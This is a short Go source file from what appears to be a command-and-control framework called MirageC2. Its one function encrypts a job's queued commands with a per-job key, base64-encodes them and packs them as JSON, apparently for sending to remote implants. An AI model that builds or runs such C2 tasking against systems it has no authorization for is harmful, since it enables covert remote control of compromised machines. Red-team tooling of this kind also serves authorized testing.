package webstart

import (
	"MirageC2_V1.0/app/exchange"
	"MirageC2_V1.0/public/common"
	"encoding/base64"
	"encoding/json"
	"fmt"
)

func EnCommand(intID int) []byte {
	tasks := common.Jobs[intID-1].Tasks
	if len(tasks) == 0 {
		return nil
	}
	for id, command := range tasks {
		tasks[id] = base64.StdEncoding.EncodeToString(exchange.CommandCrypto(command, common.Jobs[intID-1].Key))
	}
	jsonData, err := json.Marshal(tasks)
	if err != nil {
		fmt.Println("[-] Error marshalling map to JSON:", err)
		return nil
	}
	return jsonData
}
